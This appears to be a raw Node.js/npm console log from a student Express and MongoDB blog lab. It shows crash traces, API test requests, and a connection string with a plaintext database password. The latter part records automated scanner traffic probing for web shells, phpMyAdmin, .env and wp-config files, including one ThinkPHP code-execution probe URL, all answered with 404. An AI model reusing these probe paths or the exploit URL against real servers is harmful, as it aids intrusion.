             { $set: {"dateOfCreation": req.body.dateOfCreation}}
                                                                ^

SyntaxError: missing ) after argument list
    at createScript (vm.js:80:10)
    at Object.runInThisContext (vm.js:139:10)
    at Module._compile (module.js:616:28)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:13:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T09_53_13_106Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
/home/bitnami/lab4/blogger/app_api/controllers/blogs.js:100
             { $set: {"dateOfCreation": req.body.dateOfCreation}}
                                                                ^

SyntaxError: missing ) after argument list
    at createScript (vm.js:80:10)
    at Object.runInThisContext (vm.js:139:10)
    at Module._compile (module.js:616:28)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:13:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T10_11_51_209Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
/home/bitnami/lab4/blogger/node_modules/express/lib/router/route.js:202
        throw new Error(msg);
        ^

Error: Route.put() requires callback functions but got a [object Undefined]
    at Route.(anonymous function) [as put] (/home/bitnami/lab4/blogger/node_modules/express/lib/router/route.js:202:15)
    at Function.proto.(anonymous function) [as put] (/home/bitnami/lab4/blogger/node_modules/express/lib/router/index.js:510:19)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:19:8)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app.js:10:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T10_13_05_239Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
/home/bitnami/lab4/blogger/node_modules/express/lib/router/route.js:202
        throw new Error(msg);
        ^

Error: Route.put() requires callback functions but got a [object Undefined]
    at Route.(anonymous function) [as put] (/home/bitnami/lab4/blogger/node_modules/express/lib/router/route.js:202:15)
    at Function.proto.(anonymous function) [as put] (/home/bitnami/lab4/blogger/node_modules/express/lib/router/index.js:510:19)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:19:8)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app.js:10:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T10_20_40_916Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Mongoose connected to mongodb://blogUser:12345678@localhost/Blogger
[0mPUT /api//blogs [33m404 [0m20.628 ms - 1527[0m
[0mPUT /api//blogs/5c9c92ac9524221232d27c4b [31m500 [0m2.453 ms - 1649[0m
[0mPUT /api//blogs/5c9c92ac9524221232d27c4b [31m500 [0m1.123 ms - 1649[0m
Killed
npm ERR! code ELIFECYCLE
npm ERR! errno 137
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 137
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T10_34_23_679Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Mongoose connected to mongodb://blogUser:12345678@localhost/Blogger
[0mPUT /api//blogs/5c9c92ac9524221232d27c4b [32m200 [0m43.397 ms - 143[0m
Killed
npm ERR! code ELIFECYCLE
npm ERR! errno 137
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 137
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T10_38_55_755Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
/home/bitnami/lab4/blogger/node_modules/express/lib/router/route.js:202
        throw new Error(msg);
        ^

Error: Route.delete() requires callback functions but got a [object Undefined]
    at Route.(anonymous function) [as delete] (/home/bitnami/lab4/blogger/node_modules/express/lib/router/route.js:202:15)
    at Function.proto.(anonymous function) [as delete] (/home/bitnami/lab4/blogger/node_modules/express/lib/router/index.js:510:19)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:20:14)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app.js:10:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T10_38_59_779Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
/home/bitnami/lab4/blogger/node_modules/express/lib/router/route.js:202
        throw new Error(msg);
        ^

Error: Route.delete() requires callback functions but got a [object Undefined]
    at Route.(anonymous function) [as delete] (/home/bitnami/lab4/blogger/node_modules/express/lib/router/route.js:202:15)
    at Function.proto.(anonymous function) [as delete] (/home/bitnami/lab4/blogger/node_modules/express/lib/router/index.js:510:19)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:20:14)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app.js:10:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T10_42_09_293Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
/home/bitnami/lab4/blogger/node_modules/express/lib/router/route.js:202
        throw new Error(msg);
        ^

Error: Route.delete() requires callback functions but got a [object Undefined]
    at Route.(anonymous function) [as delete] (/home/bitnami/lab4/blogger/node_modules/express/lib/router/route.js:202:15)
    at Function.proto.(anonymous function) [as delete] (/home/bitnami/lab4/blogger/node_modules/express/lib/router/index.js:510:19)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app_api/routes/index.js:20:14)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
    at Module.require (module.js:596:17)
    at require (internal/module.js:11:18)
    at Object.<anonymous> (/home/bitnami/lab4/blogger/app.js:10:17)
    at Module._compile (module.js:652:30)
    at Object.Module._extensions..js (module.js:663:10)
    at Module.load (module.js:565:32)
    at tryModuleLoad (module.js:505:12)
    at Function.Module._load (module.js:497:3)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T10_55_19_675Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Mongoose connected to mongodb://blogUser:12345678@localhost/Blogger
Killed
npm ERR! code ELIFECYCLE
npm ERR! errno 137
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 137
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T10_59_42_718Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Mongoose connected to mongodb://blogUser:12345678@localhost/Blogger
Deleting blog entry with id of undefined
{ blogTitle: 'putTestTitlte',
  blogText: 'putTestBlogText',
  dateOfCreation: '0000-02-24T03:24:00Z' }
(node:5542) DeprecationWarning: collection.findAndModify is deprecated. Use findOneAndUpdate, findOneAndReplace or findOneAndDelete instead.
[0mDELETE /api//blogs/5c9c92ac9524221232d27c4b [32m204 [0m28.356 ms - -[0m
Deleting blog entry with id of undefined
{ blogTitle: 'putTestTitlte',
  blogText: 'putTestBlogText',
  dateOfCreation: '0000-02-24T03:24:00Z' }
[0mDELETE /api//blogs/5c9c92ac9524221232d27c4b [32m204 [0m3.433 ms - -[0m
[0mPOST /api//blogs/5c9c92ac9524221232d27c4b [33m404 [0m7.947 ms - 1527[0m
[0mPOST /api//blogs/5c9c92ac9524221232d27c4b [33m404 [0m1.876 ms - 1527[0m
Killed
npm ERR! code ELIFECYCLE
npm ERR! errno 137
npm ERR! blogger@0.0.0 start: `PORT=80 node ./bin/www`
npm ERR! Exit status 137
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2019-03-28T11_06_13_506Z-debug.log

> blogger@0.0.0 start /home/bitnami/lab4/blogger
> PORT=80 node ./bin/www

true
Mongoose connected to mongodb://blogUser:12345678@localhost/Blogger
[0mPOST /api//blogs/5c9c92ac9524221232d27c4b [33m404 [0m19.764 ms - 1527[0m
Getting blogs list
[ { _id: 5c731c1b872de1ce8a0b7784,
    blogTitle: 'First Blog Title',
    blogText: 'First Blog Text',
    dateOfCreation: 3030-02-24T03:24:00.000Z },
  { _id: 5c731c3e872de1ce8a0b7785,
    blogTitle: '2nd Blog Title',
    blogText: '2nd Blog Text',
    dateOfCreation: 3040-02-24T03:24:00.000Z },
  { _id: 5c731c59872de1ce8a0b7786,
    blogTitle: '3rd Blog Title',
    blogText: '3rd Blog Text',
    dateOfCreation: 3050-02-24T03:24:00.000Z },
  { _id: 5c9c92ac9524221232d27c4b,
    blogTitle: 'putTestTitlte',
    blogText: 'putTestBlogText',
    dateOfCreation: 0000-02-24T03:24:00.000Z,
    __v: 0 } ]
[0mGET /api//blogs/ [32m200 [0m24.337 ms - 546[0m
Getting blogs list
[ { _id: 5c731c1b872de1ce8a0b7784,
    blogTitle: 'First Blog Title',
    blogText: 'First Blog Text',
    dateOfCreation: 3030-02-24T03:24:00.000Z },
  { _id: 5c731c3e872de1ce8a0b7785,
    blogTitle: '2nd Blog Title',
    blogText: '2nd Blog Text',
    dateOfCreation: 3040-02-24T03:24:00.000Z },
  { _id: 5c731c59872de1ce8a0b7786,
    blogTitle: '3rd Blog Title',
    blogText: '3rd Blog Text',
    dateOfCreation: 3050-02-24T03:24:00.000Z },
  { _id: 5c9c92ac9524221232d27c4b,
    blogTitle: 'putTestTitlte',
    blogText: 'putTestBlogText',
    dateOfCreation: 0000-02-24T03:24:00.000Z,
    __v: 0 } ]
[0mGET /api//blogs/ [32m200 [0m4.063 ms - 546[0m
Deleting blog entry with id of undefined
{ blogTitle: 'putTestTitlte',
  blogText: 'putTestBlogText',
  dateOfCreation: '0000-02-24T03:24:00Z' }
(node:5582) DeprecationWarning: collection.findAndModify is deprecated. Use findOneAndUpdate, findOneAndReplace or findOneAndDelete instead.
[0mDELETE /api//blogs/5c9c92ac9524221232d27c4b [32m204 [0m9.265 ms - -[0m
Deleting blog entry with id of undefined
{ blogTitle: 'putTestTitlte',
  blogText: 'putTestBlogText',
  dateOfCreation: '0000-02-24T03:24:00Z' }
[0mDELETE /api//blogs/5c731c1b872de1ce8a0b7784 [32m204 [0m2.599 ms - -[0m
Deleting blog entry with id of undefined
{ blogTitle: 'putTestTitlte',
  blogText: 'putTestBlogText',
  dateOfCreation: '0000-02-24T03:24:00Z' }
[0mDELETE /api//blogs/5c731c1b872de1ce8a0b7784 [32m204 [0m2.330 ms - -[0m
[0mPOST /api//blogs/5c731c1b872de1ce8a0b7784 [33m404 [0m1.686 ms - 1527[0m
[0mGET / [32m200 [0m1.416 ms - 967[0m
[0mGET / [32m200 [0m1.337 ms - 967[0m
[0mGET / [32m200 [0m0.757 ms - 967[0m
[0mHEAD /robots.txt [33m404 [0m1.197 ms - 1539[0m
[0mGET / [32m200 [0m0.759 ms - 967[0m
[0mGET / [32m200 [0m0.705 ms - 967[0m
[0mGET / [32m200 [0m0.691 ms - 967[0m
[0mGET / [32m200 [0m0.694 ms - 967[0m
[0mGET / [32m200 [0m0.701 ms - 967[0m
[0mGET /wp-login.php [33m404 [0m1.205 ms - 1539[0m
[0mGET / [32m200 [0m0.802 ms - 967[0m
[0mGET / [32m200 [0m0.706 ms - 967[0m
[0mGET / [32m200 [0m0.701 ms - 967[0m
[0mGET /.env [33m404 [0m1.427 ms - 1539[0m
[0mGET / [32m200 [0m0.798 ms - 967[0m
[0mGET / [32m200 [0m0.954 ms - 967[0m
[0mGET / [32m200 [0m0.781 ms - 967[0m
[0mGET / [32m200 [0m0.752 ms - 967[0m
[0mGET / [32m200 [0m1.041 ms - 967[0m
[0mGET / [32m200 [0m0.744 ms - 967[0m
[0mGET / [32m200 [0m1.247 ms - 967[0m
[0mGET / [32m200 [0m0.728 ms - 967[0m
[0mGET / [32m200 [0m16.640 ms - 967[0m
[0mGET / [32m200 [0m0.727 ms - 967[0m
[0mGET / [32m200 [0m0.778 ms - 967[0m
[0mGET / [32m200 [0m0.728 ms - 967[0m
[0mGET / [32m200 [0m1.033 ms - 967[0m
[0mGET /favicon.ico [33m404 [0m2.203 ms - 1539[0m
[0mGET /TP/public/index.php [33m404 [0m1.464 ms - 1539[0m
[0mGET /TP/index.php [33m404 [0m0.861 ms - 1539[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.860 ms - 1539[0m
[0mGET /html/public/index.php [33m404 [0m1.138 ms - 1539[0m
[0mGET /public/index.php [33m404 [0m1.185 ms - 1539[0m
[0mGET /TP/html/public/index.php [33m404 [0m1.146 ms - 1539[0m
[0mGET /elrekt.php [33m404 [0m0.798 ms - 1539[0m
[0mGET /index.php [33m404 [0m0.853 ms - 1539[0m
[0mGET / [32m200 [0m0.766 ms - 967[0m
[0mGET / [32m200 [0m0.790 ms - 967[0m
[0mGET / [32m200 [0m0.743 ms - 967[0m
[0mGET / [36m304 [0m2.672 ms - -[0m
[0mPOST /App9e7f4934.php [33m404 [0m1.537 ms - 1534[0m
[0mPROPFIND / [33m404 [0m0.723 ms - 1534[0m
[0mGET /webdav/ [33m404 [0m1.051 ms - 1539[0m
[0mGET /help.php [33m404 [0m0.855 ms - 1539[0m
[0mGET /_query.php [33m404 [0m0.927 ms - 1539[0m
[0mGET /test.php [33m404 [0m0.878 ms - 1539[0m
[0mGET /db_cts.php [33m404 [0m0.887 ms - 1539[0m
[0mGET /db_pma.php [33m404 [0m1.218 ms - 1539[0m
[0mGET /logon.php [33m404 [0m1.048 ms - 1539[0m
[0mGET /help-e.php [33m404 [0m0.908 ms - 1539[0m
[0mGET /license.php [33m404 [0m0.884 ms - 1539[0m
[0mGET /log.php [33m404 [0m0.948 ms - 1539[0m
[0mGET /hell.php [33m404 [0m0.880 ms - 1539[0m
[0mGET /pmd_online.php [33m404 [0m0.931 ms - 1539[0m
[0mGET /x.php [33m404 [0m0.862 ms - 1539[0m
[0mGET /htdocs.php [33m404 [0m1.865 ms - 1539[0m
[0mGET /desktop.ini.php [33m404 [0m1.023 ms - 1539[0m
[0mGET /lala.php [33m404 [0m0.903 ms - 1539[0m
[0mGET /lala-dpr.php [33m404 [0m0.901 ms - 1539[0m
[0mGET /wpo.php [33m404 [0m0.865 ms - 1539[0m
[0mGET /t6nv.php [33m404 [0m0.719 ms - 1539[0m
[0mGET /text.php [33m404 [0m0.819 ms - 1539[0m
[0mGET /wp-config.php [33m404 [0m0.831 ms - 1539[0m
[0mGET /muhstik.php [33m404 [0m1.139 ms - 1539[0m
[0mGET /muhstik2.php [33m404 [0m0.844 ms - 1539[0m
[0mGET /muhstiks.php [33m404 [0m0.819 ms - 1539[0m
[0mGET /muhstik-dpr.php [33m404 [0m1.211 ms - 1539[0m
[0mGET /lol.php [33m404 [0m1.540 ms - 1539[0m
[0mGET /uploader.php [33m404 [0m1.041 ms - 1539[0m
[0mGET /cmd.php [33m404 [0m1.168 ms - 1539[0m
[0mGET /cmv.php [33m404 [0m0.905 ms - 1539[0m
[0mGET /cmdd.php [33m404 [0m1.167 ms - 1539[0m
[0mGET /knal.php [33m404 [0m0.846 ms - 1539[0m
[0mGET /cmd.php [33m404 [0m0.823 ms - 1539[0m
[0mGET /shell.php [33m404 [0m0.876 ms - 1539[0m
[0mGET /appserv.php [33m404 [0m1.100 ms - 1539[0m
[0mGET /scripts/setup.php [33m404 [0m1.128 ms - 1539[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m1.135 ms - 1539[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m0.864 ms - 1539[0m
[0mGET /phpmyadmin/scripts/db___.init.php [33m404 [0m0.874 ms - 1539[0m
[0mGET /phpMyAdmin/scripts/db___.init.php [33m404 [0m0.918 ms - 1539[0m
[0mGET /cacti/plugins/weathermap/editor.php [33m404 [0m1.061 ms - 1539[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m1.018 ms - 1539[0m
[0mGET /d7.php [33m404 [0m0.867 ms - 1539[0m
[0mGET /rxr.php [33m404 [0m0.934 ms - 1539[0m
[0mGET /home.php [33m404 [0m1.138 ms - 1539[0m
[0mGET /undx.php [33m404 [0m0.962 ms - 1539[0m
[0mGET /spider.php [33m404 [0m0.919 ms - 1539[0m
[0mGET /payload.php [33m404 [0m0.634 ms - 1539[0m
[0mGET /composers.php [33m404 [0m0.888 ms - 1539[0m
[0mGET /izom.php [33m404 [0m1.468 ms - 1539[0m
[0mGET /composer.php [33m404 [0m1.106 ms - 1539[0m
[0mGET /Drupal.php [33m404 [0m0.844 ms - 1539[0m
[0mGET /lang.php?f=1 [33m404 [0m0.861 ms - 1539[0m
[0mGET /izom.php [33m404 [0m0.805 ms - 1539[0m
[0mGET /payload.php [33m404 [0m1.056 ms - 1539[0m
[0mGET /new_license.php [33m404 [0m1.239 ms - 1539[0m
[0mGET /libraries/joomla/jmail.php?waled=1 [33m404 [0m0.844 ms - 1539[0m
[0mGET /libraries/joomla/jmails.php?waled=1 [33m404 [0m0.838 ms - 1539[0m
[0mGET /libraries/joomla/wl.php?0=1 [33m404 [0m0.884 ms - 1539[0m
[0mGET /images/vuln.php [33m404 [0m1.370 ms - 1539[0m
[0mPOST /wuwu11.php [33m404 [0m0.905 ms - 1534[0m
[0mPOST /xw.php [33m404 [0m1.419 ms - 1534[0m
[0mPOST /xw1.php [33m404 [0m0.927 ms - 1534[0m
[0mPOST /9678.php [33m404 [0m0.960 ms - 1534[0m
[0mPOST /wc.php [33m404 [0m0.949 ms - 1534[0m
[0mPOST /xx.php [33m404 [0m0.895 ms - 1534[0m
[0mPOST /s.php [33m404 [0m0.846 ms - 1534[0m
[0mPOST /w.php [33m404 [0m0.854 ms - 1534[0m
[0mPOST /sheep.php [33m404 [0m0.974 ms - 1534[0m
[0mPOST /qaq.php [33m404 [0m0.975 ms - 1534[0m
[0mPOST /db.init.php [33m404 [0m0.914 ms - 1534[0m
[0mPOST /db_session.init.php [33m404 [0m0.899 ms - 1534[0m
[0mPOST /db__.init.php [33m404 [0m1.162 ms - 1534[0m
[0mPOST /wp-admins.php [33m404 [0m1.007 ms - 1534[0m
[0mPOST /099.php [33m404 [0m9.141 ms - 1534[0m
[0mPOST /_404.php [33m404 [0m0.881 ms - 1534[0m
[0mPOST /p34ky1337.php [33m404 [0m1.167 ms - 1534[0m
[0mPOST /pk1914.php [33m404 [0m0.988 ms - 1534[0m
[0mPOST /Skri.php [33m404 [0m0.921 ms - 1534[0m
[0mPOST /db_dataml.php [33m404 [0m0.835 ms - 1534[0m
[0mPOST /wshell.php [33m404 [0m0.833 ms - 1534[0m
[0mPOST /xshell.php [33m404 [0m0.870 ms - 1534[0m
[0mPOST /conflg.php [33m404 [0m0.839 ms - 1534[0m
[0mPOST /conflg.php [33m404 [0m0.728 ms - 1534[0m
[0mPOST /phpstudy.php [33m404 [0m1.504 ms - 1534[0m
[0mPOST /phpStudy.php [33m404 [0m0.784 ms - 1534[0m
[0mPOST /feixiang.php [33m404 [0m0.877 ms - 1534[0m
[0mPOST /ak47.php [33m404 [0m0.851 ms - 1534[0m
[0mGET /index.php [33m404 [0m0.877 ms - 1539[0m
[0mGET /phpmyadmin/index.php [33m404 [0m0.755 ms - 1539[0m
[0mGET /phpMyAdmin/index.php [33m404 [0m0.855 ms - 1539[0m
[0mGET /pmd/index.php [33m404 [0m0.813 ms - 1539[0m
[0mGET /pma/index.php [33m404 [0m5.582 ms - 1539[0m
[0mGET /pmamy/index.php [33m404 [0m1.243 ms - 1539[0m
[0mGET /pmamy2/index.php [33m404 [0m1.169 ms - 1539[0m
[0mGET /admin/index.php [33m404 [0m1.138 ms - 1539[0m
[0mGET /db/index.php [33m404 [0m0.741 ms - 1539[0m
[0mGET /dbadmin/index.php [33m404 [0m0.868 ms - 1539[0m
[0mGET /web/phpMyAdmin/index.php [33m404 [0m1.165 ms - 1539[0m
[0mGET /admin/pma/index.php [33m404 [0m0.905 ms - 1539[0m
[0mGET /admin/PMA/index.php [33m404 [0m0.817 ms - 1539[0m
[0mGET /admin/mysql/index.php [33m404 [0m0.873 ms - 1539[0m
[0mGET /admin/mysql2/index.php [33m404 [0m0.901 ms - 1539[0m
[0mGET /admin/phpmyadmin/index.php [33m404 [0m0.886 ms - 1539[0m
[0mGET /admin/phpMyAdmin/index.php [33m404 [0m1.090 ms - 1539[0m
[0mGET /admin/phpmyadmin2/index.php [33m404 [0m0.807 ms - 1539[0m
[0mGET /mysqladmin/index.php [33m404 [0m0.943 ms - 1539[0m
[0mGET /mysql-admin/index.php [33m404 [0m1.941 ms - 1539[0m
[0mGET /mysql_admin/index.php [33m404 [0m1.159 ms - 1539[0m
[0mGET /phpadmin/index.php [33m404 [0m1.187 ms - 1539[0m
[0mGET /phpmyadmin0/index.php [33m404 [0m0.918 ms - 1539[0m
[0mGET /phpmyadmin1/index.php [33m404 [0m0.975 ms - 1539[0m
[0mGET /phpmyadmin2/index.php [33m404 [0m1.103 ms - 1539[0m
[0mGET /phpMyAdmin-4.4.0/index.php [33m404 [0m0.948 ms - 1539[0m
[0mGET /myadmin/index.php [33m404 [0m0.770 ms - 1539[0m
[0mGET /myadmin2/index.php [33m404 [0m0.894 ms - 1539[0m
[0mGET /xampp/phpmyadmin/index.php [33m404 [0m0.835 ms - 1539[0m
[0mGET /phpMyadmin_bak/index.php [33m404 [0m0.875 ms - 1539[0m
[0mGET /www/phpMyAdmin/index.php [33m404 [0m0.924 ms - 1539[0m
[0mGET /tools/phpMyAdmin/index.php [33m404 [0m0.909 ms - 1539[0m
[0mGET /phpmyadmin-old/index.php [33m404 [0m0.846 ms - 1539[0m
[0mGET /phpMyAdminold/index.php [33m404 [0m0.882 ms - 1539[0m
[0mGET /phpMyAdmin.old/index.php [33m404 [0m0.981 ms - 1539[0m
[0mGET /pma-old/index.php [33m404 [0m0.929 ms - 1539[0m
[0mGET /claroline/phpMyAdmin/index.php [33m404 [0m1.133 ms - 1539[0m
[0mGET /typo3/phpmyadmin/index.php [33m404 [0m1.084 ms - 1539[0m
[0mGET /phpma/index.php [33m404 [0m1.102 ms - 1539[0m
[0mGET /phpmyadmin/phpmyadmin/index.php [33m404 [0m0.811 ms - 1539[0m
[0mGET /phpMyAdmin/phpMyAdmin/index.php [33m404 [0m1.024 ms - 1539[0m
[0mGET /phpMyAbmin/index.php [33m404 [0m0.954 ms - 1539[0m
[0mGET /phpMyAdmin__/index.php [33m404 [0m0.914 ms - 1539[0m
[0mGET /phpMyAdmin+++---/index.php [33m404 [0m0.892 ms - 1539[0m
[0mGET /v/index.php [33m404 [0m0.830 ms - 1539[0m
[0mGET /phpmyadm1n/index.php [33m404 [0m0.769 ms - 1539[0m
[0mGET /phpMyAdm1n/index.php [33m404 [0m0.936 ms - 1539[0m
[0mGET /shaAdmin/index.php [33m404 [0m0.878 ms - 1539[0m
[0mGET /phpMyadmi/index.php [33m404 [0m0.869 ms - 1539[0m
[0mGET /phpMyAdmion/index.php [33m404 [0m0.993 ms - 1539[0m
[0mGET /s/index.php [33m404 [0m0.889 ms - 1539[0m
[0mGET /MyAdmin/index.php [33m404 [0m0.948 ms - 1539[0m
[0mGET /phpMyAdmin1/index.php [33m404 [0m0.857 ms - 1539[0m
[0mGET /phpMyAdmin123/index.php [33m404 [0m0.851 ms - 1539[0m
[0mGET /pwd/index.php [33m404 [0m1.363 ms - 1539[0m
[0mGET /phpMyAdmina/index.php [33m404 [0m0.760 ms - 1539[0m
[0mGET /phpMydmin/index.php [33m404 [0m0.951 ms - 1539[0m
[0mGET /phpMyAdmins/index.php [33m404 [0m0.853 ms - 1539[0m
[0mGET /phpMyAdmin._/index.php [33m404 [0m1.106 ms - 1539[0m
[0mGET /phpmyadmin2222/index.php [33m404 [0m3.753 ms - 1539[0m
[0mGET /php2MyAdmin/index.php [33m404 [0m1.245 ms - 1539[0m
[0mGET /phpiMyAdmin/index.php [33m404 [0m1.160 ms - 1539[0m
[0mGET /phpNyAdmin/index.php [33m404 [0m1.058 ms - 1539[0m
[0mGET /program/index.php [33m404 [0m1.127 ms - 1539[0m
[0mGET /shopdb/index.php [33m404 [0m0.947 ms - 1539[0m
[0mGET /phppma/index.php [33m404 [0m1.080 ms - 1539[0m
[0mGET /phpmy/index.php [33m404 [0m2.057 ms - 1539[0m
[0mGET /mysql/admin/index.php [33m404 [0m0.909 ms - 1539[0m
